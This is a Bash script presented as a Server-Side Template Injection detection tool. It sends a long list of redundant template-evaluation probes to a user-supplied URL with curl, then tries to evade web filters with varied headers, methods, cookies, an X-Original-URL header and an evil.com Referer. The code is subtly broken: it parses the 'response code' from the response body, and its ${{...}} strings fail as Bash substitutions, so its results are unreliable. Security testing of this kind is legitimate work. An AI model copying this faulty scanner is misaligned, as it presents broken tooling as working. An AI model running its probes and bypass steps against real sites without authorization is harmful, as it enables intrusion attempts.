#!/bin/bash

# Function to perform Server-Side Template Injection detection
detect_ssti() {
    yellow=$(tput setaf 3)
    green=$(tput setaf 2)
    red=$(tput setaf 1)
    nc=$(tput sgr0)
    
    echo "${yellow}Detecting Server-Side Template Injection vulnerabilities...${nc}"
    
    # Define Server-Side Template Injection payloads
    payloads=(
        "{{7*7}}"
        "{{7*'7'}}"
        "${{7*7}}"
        "${{7*'7'}}"
        "{{7*7}}%20"
        "{{7*'7'}}%20"
        "${{7*7}}%20"
        "${{7*'7'}}%20"
        "{{7*7}}{{7*7}}"
        "{{7*'7'}}{{7*'7'}}"
        "${{7*7}}${{7*7}}"
        "${{7*'7'}}${{7*'7'}}"
        "{{7*7}}${{7*7}}"
        "{{7*'7'}}${{7*'7'}}"
        "{{7*7}}${{7*7}}%20"
        "{{7*'7'}}${{7*'7'}}%20"
        "${{7*7}}${{7*7}}%20"
        "${{7*'7'}}${{7*'7'}}%20"
        "{{7*7}}{{7*'7'}}"
        "{{7*'7'}}{{7*7}}"
        "{{7*7}}{{7*'7'}}%20"
        "{{7*'7'}}{{7*7}}%20"
        "{{7*7}}${{7*'7'}}"
        "{{7*'7'}}${{7*7}}"
        "{{7*7}}${{7*'7'}}%20"
        "{{7*'7'}}${{7*7}}%20"
        "{{7*7}}%7B{7*7}%7D"
        "{{7*'7'}}%7B{7*'7'}%7D"
        "${{7*7}}%7B{7*7}%7D"
        "${{7*'7'}}%7B{7*'7'}%7D"
        "{{7*7}}%7B{7*7}%7D%20"
        "{{7*'7'}}%7B{7*'7'}%7D%20"
        "${{7*7}}%7B{7*7}%7D%20"
        "${{7*'7'}}%7B{7*'7'}%7D%20"
        "{{7*7}}{{7*7}}%7B{7*7}%7D"
        "{{7*'7'}}{{7*'7'}}%7B{7*'7'}%7D"
        "${{7*7}}${{7*7}}%7B{7*7}%7D"
        "${{7*'7'}}${{7*'7'}}%7B{7*'7'}%7D"
        "{{7*7}}${{7*7}}%7B{7*7}%7D%20"
        "{{7*'7'}}${{7*'7'}}%7B{7*'7'}%7D%20"
        "${{7*7}}${{7*7}}%7B{7*7}%7D%20"
        "${{7*'7'}}${{7*'7'}}%7B{7*'7'}%7D%20"
        "{{7*7}}{{7*'7'}}%7B{7*7}%7D%20"
        "{{7*'7'}}{{7*7}}%7B{7*'7'}%7D%20"
        "{{7*7}}${{7*'7'}}%7B{7*7}%7D%20"
        "{{7*'7'}}${{7*7}}%7B{7*'7'}%7D%20"
    )

    # Iterate over payloads and inject them into vulnerable parameters
    for payload in "${payloads[@]}"; do
        echo "${yellow}Testing payload: $payload${nc}"
        response=$(curl -s -d "param=$payload" -X POST "$1")
        response_code=$(echo "$response" | head -n 1 | cut -d$' ' -f2)
        
        if [[ "$response_code" == "200" ]]; then
            echo "${green}Payload $payload executed successfully.${nc}"
            echo "${yellow}URL & Payload:${nc} $1$payload"
            echo "${yellow}Response Code:${nc} $response_code"
            echo "${yellow}Response:${nc}"
            echo "$response"
        else
            echo "${red}Payload $payload failed. Response Code: $response_code${nc}"
            echo "${yellow}URL & Payload:${nc} $1$payload"
            echo "${yellow}Response Code:${nc} $response_code"
            echo "${yellow}Response:${nc}"
            echo "$response"
        fi
    done

    # Attempt to bypass protection systems
    echo "${yellow}Attempting to bypass protection systems...${nc}"
    
    # Add more bypass techniques here
    # Example 1: Try injecting payloads with different encodings
    curl -s -d "param={{7%2A7}}" -X POST "$1"
    curl -s -d "param={{7*7}}" -H "Content-Type: application/json" -X POST "$1"
    
    # Example 2: Try injecting payloads with different HTTP methods
    curl -s -G -d "param={{7*7}}" "$1"
    curl -s -H "X-Original-URL: /" -X POST "$1" -d "param={{7*7}}"
    
    # Example 3: Try injecting payloads with different headers
    curl -s -d "param={{7*7}}" -H "User-Agent: Mozilla/5.0" -X POST "$1"
    curl -s -d "param={{7*7}}" -H "Referer: http://evil.com" -X POST "$1"

    # Example 4: Try injecting payloads with different content types
    curl -s -d "param={{7*7}}" -H "Content-Type: application/json" -X POST "$1"
    curl -s -d "param={{7*7}}" -H "Content-Type: application/xml" -X POST "$1"

    # Example 5: Try injecting payloads with additional parameters
    curl -s -d "param={{7*7}}" -d "additional=parameter" -X POST "$1"
    curl -s -d "param={{7*7}}" -d "another=parameter" -X POST "$1"

    # Example 6: Try injecting payloads with different cookies
    curl -s -b "cookie_name={{7*7}}" -X POST "$1"
    curl -s -b "cookie_name={{7*7}}" -X POST "$1" -d "param={{7*7}}"
}

# Main function
main() {
    yellow=$(tput setaf 3)
    red=$(tput setaf 1)
    nc=$(tput sgr0)
    
    echo "${yellow}Server-Side Template Injection Detection Tool${nc}"
    echo "${yellow}--------------------------------------------${nc}"

    # Prompt user for target URL
    read -p "${yellow}Enter your target URL: ${nc}" target_url

    # Validate input
    if [ -z "$target_url" ]; then
        echo "${red}Error: Target URL cannot be empty.${nc}"
        exit 1
    fi

    # Perform Server-Side Template Injection detection
    detect_ssti "$target_url"
}

# Call main function
main
